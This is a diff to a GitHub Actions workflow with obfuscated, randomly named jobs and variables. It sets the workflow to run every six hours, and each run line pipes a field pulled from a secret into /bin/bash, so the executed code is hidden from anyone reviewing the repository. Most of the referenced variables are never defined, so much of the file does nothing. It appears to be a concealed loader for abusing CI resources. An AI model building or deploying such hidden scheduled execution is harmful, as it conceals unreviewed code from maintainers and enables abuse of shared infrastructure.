@@ -1,37 +1,29 @@
 name: huangyunxiao7461
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 5/6 * * *'
+    - cron: '5 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangyunxiao7461
         env:
-          i7685: ${{ secrets.i7685 }}
+          rdevh79112: ${{ secrets.rdevh79112 }}
         run: |
-          echo $i7685 | jq -r .g90767 | /bin/bash
-          echo $ijt8 | jq -r .rxzs21191 | /bin/bash
-          echo $rfkzr69 | jq -r .z3 | /bin/bash
-          echo $f83 | jq -r .yn94 | /bin/bash
-          echo $gmxd2730 | jq -r .ammd5564 | /bin/bash
-          echo $ee3342 | jq -r .t364 | /bin/bash
-          echo $d3 | jq -r .ynrd7 | /bin/bash
-          echo $mnh3255 | jq -r .o6659 | /bin/bash
-          echo $xm057 | jq -r .bha2462 | /bin/bash
-          echo $q9 | jq -r .k36 | /bin/bash
-          echo $zyj73 | jq -r .xy2 | /bin/bash
-          echo $zhl8788 | jq -r .os3 | /bin/bash
-          echo $y22035 | jq -r .vgp14 | /bin/bash
-          echo $m1 | jq -r .xm68076 | /bin/bash
-          echo $j9617 | jq -r .r47 | /bin/bash
-          echo $xlmc8 | jq -r .y47 | /bin/bash
-          echo $j5 | jq -r .e10 | /bin/bash
-          echo $fqlf397 | jq -r .q5 | /bin/bash
-          echo $dsll6 | jq -r .cd0 | /bin/bash
-          echo $czly32 | jq -r .f74 | /bin/bash
+          echo $rdevh79112 | jq -r .xyavb6 | /bin/bash
+          echo $liijh76 | jq -r .mktt66534 | /bin/bash
+          echo $uwo580 | jq -r .qbsq9990 | /bin/bash
+          echo $wlvqr15229 | jq -r .mvh62041 | /bin/bash
+          echo $dsyo14720 | jq -r .pw1474 | /bin/bash
+          echo $fg32822 | jq -r .s7 | /bin/bash
+          echo $rs97062 | jq -r .pnstn377 | /bin/bash
+          echo $qr264 | jq -r .d2 | /bin/bash
+          echo $bqju8 | jq -r .owwd77 | /bin/bash
+          echo $jl1119 | jq -r .dyexl22 | /bin/bash
+          echo $n1 | jq -r .su33 | /bin/bash
+          echo $tlg4 | jq -r .zguf0 | /bin/bash
+          echo $gobm155 | jq -r .tpo68289 | /bin/bash
+          echo $eeyl32446 | jq -r .etfn4 | /bin/bash
 
